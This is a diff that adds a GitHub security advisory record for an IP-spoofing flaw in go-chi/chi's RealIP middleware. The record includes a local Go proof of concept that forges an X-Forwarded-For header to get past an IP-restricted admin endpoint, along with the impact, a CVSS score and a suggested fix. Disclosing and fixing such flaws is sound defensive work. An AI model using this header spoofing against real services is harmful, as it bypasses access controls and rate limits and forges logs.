@@ -1,0 +1,42 @@
+{
+  "id": "GHSA-3fxj-6jh8-hvhx",
+  "modified": "2026-06-25T18:30:09.543604237Z",
+  "published": "2026-06-25T18:21:37Z",
+  "summary": "chi Has an IP Spoofing Vulnerability in `middleware.RealIP`",
+  "details": "## Summary\nThe `RealIP` middleware in `go-chi/chi` is vulnerable to IP spoofing because it blindly trusts the first (leftmost) element of the `X-Forwarded-For` HTTP header. This allows a remote attacker to bypass IP-based access control lists (ACLs) and rate-limiting mechanisms by providing a spoofed IP address in the header.\n\n## Details\nIn `middleware/realip.go`, the `realIP` function parses the `X-Forwarded-For` header and extracts the first comma-separated value:\n\n```go\nfunc realIP(r *http.Request) string {\n    // ...\n    } else if xff := r.Header.Get(xForwardedFor); xff != \"\" {\n        ip, _, _ = strings.Cut(xff, \",\")\n    }\n    // ...\n}\n```\n\nStandard practice for `X-Forwarded-For` is that each proxy appends the client's IP to the end of the list. However, since the client can also provide this header, the leftmost values are untrusted. A client can send a header like `X-Forwarded-For: \u003cspoofed_ip\u003e, \u003cactual_proxy_ip\u003e`, and `go-chi/chi` will treat `\u003cspoofed_ip\u003e` as the source of the request.\n\n## Proof of Concept (PoC)\nThe following code demonstrates how an attacker can bypass an IP-based restriction.\n\n```go\npackage main\n\nimport (\n        \"fmt\"\n        \"net/http\"\n        \"net/http/httptest\"\n\n        \"github.com/go-chi/chi/v5\"\n        \"github.com/go-chi/chi/v5/middleware\"\n)\n\nfunc main() {\n        r := chi.NewRouter()\n\n        // Enable the vulnerable RealIP middleware\n        r.Use(middleware.RealIP)\n\n        // An endpoint that should be restricted to a specific administrator IP (1.2.3.4)\n        r.Get(\"/admin/secret\", func(w http.ResponseWriter, r *http.Request) {\n                clientIP := r.RemoteAddr\n                fmt.Printf(\"[Server] Request received from IP: %s\\n\", clientIP)\n\n                // Simulate IP-based access control\n                if clientIP == \"1.2.3.4\" {\n                        w.WriteHeader(http.StatusOK)\n                        w.Write([]byte(\"CONFIDENTIAL: The secret code is 42\\n\"))\n                } else {\n                        w.WriteHeader(http.StatusForbidden)\n                        w.Write([]byte(\"Access Denied: You are not an administrator.\\n\"))\n                }\n        })\n\n        // --- Attack Simulation ---\n        fmt.Println(\"--- PoC: IP Spoofing Attack on chi/middleware.RealIP ---\")\n\n        // 1. Normal Request (Should be denied)\n        req1, _ := http.NewRequest(\"GET\", \"/admin/secret\", nil)\n        rr1 := httptest.NewRecorder()\n        r.ServeHTTP(rr1, req1)\n        fmt.Printf(\"[Client] Normal Request -\u003e Status: %d, Body: %s\", rr1.Code, rr1.Body.String())\n\n        // 2. Spoofed Request (Using X-Forwarded-For)\n        // Attacker claims to be '1.2.3.4'\n        req2, _ := http.NewRequest(\"GET\", \"/admin/secret\", nil)\n        req2.Header.Set(\"X-Forwarded-For\", \"1.2.3.4, 5.6.7.8\") // 5.6.7.8 is a fake proxy IP\n        rr2 := httptest.NewRecorder()\n        r.ServeHTTP(rr2, req2)\n        fmt.Printf(\"[Client] Spoofed Request -\u003e Status: %d, Body: %s\", rr2.Code, rr2.Body.String())\n}\n```\n\n## Impact\nAn attacker can masquerade as any IP address. This can lead to:\n- **Bypass of Authentication/Authorization:** Accessing administrative panels or private APIs restricted by IP.\n- **Rate Limiting Evasion:** Circumbeting rate limiters that use `RemoteAddr` as a key.\n- **Log Forgery:** Causing incorrect IP addresses to be recorded in security logs.\n\n## CWE\n- **CWE-290:** Authentication Bypass by Spoofing\n- **CWE-345:** Insufficient Verification of Data Authenticity\n\n## CVSS Score\n- **CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N** (6.9 Moderate)\n\n## Affected Versions\n- `github.com/go-chi/chi/v5` \u003c= `v5.2.1` (and all previous versions)\n\n## Recommendation\n1.  **Stop using `middleware.RealIP`** if you cannot guarantee that the incoming request headers are from a trusted source and have been sanitized by a proxy.\n2.  Implement a trust-based IP extraction mechanism that verifies the chain of proxies.\n3.  Use the `X-Forwarded-For` header by traversing it from **right to left** and stopping at the first IP address that is not in your list of trusted proxies.\n\n## Suggested Fix\nA secure implementation of `RealIP` should allow developers to specify a list of trusted proxy IP ranges (CIDRs). Below is a conceptual example of how to fix this by traversing the `X-Forwarded-For` header from right to left:\n\n```go\nfunc GetClientIP(r *http.Request, trustedProxies []net.IPNet) string {\n        xff := r.Header.Get(\"X-Forwarded-For\")\n        if xff == \"\" {\n                return r.RemoteAddr\n        }\n\n        ips := strings.Split(xff, \",\")\n        // Traverse from right to left\n        for i := len(ips) - 1; i \u003e= 0; i-- {\n                ipStr := strings.TrimSpace(ips[i])\n                ip := net.ParseIP(ipStr)\n                if ip == nil {\n                        continue\n                }\n\n                if !isTrustedProxy(ip, trustedProxies) {\n                        return ipStr\n                }\n        }\n\n        return r.RemoteAddr\n}\n\nfunc isTrustedProxy(ip net.IP, trustedProxies []net.IPNet) bool {\n        for _, network := range trustedProxies {\n                if network.Contains(ip) {\n                        return true\n                }\n        }\n        return false\n}\n```\n\nBy providing a configuration like `middleware.RealIPWithConfig(Config{TrustedProxies: []string{\"10.0.0.0/8\"}})` , the middleware can safely identify the true client IP even in complex proxy environments.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/go-chi/chi/v5/middleware",
+        "purl": "pkg:golang/github.com/go-chi/chi/v5/middleware"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "5.2.1"
+            },
+            {
+              "fixed": "5.3.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-3fxj-6jh8-hvhx/GHSA-3fxj-6jh8-hvhx.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-chi/chi/security/advisories/GHSA-3fxj-6jh8-hvhx"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/go-chi/chi"
+    }
+  ]
+}
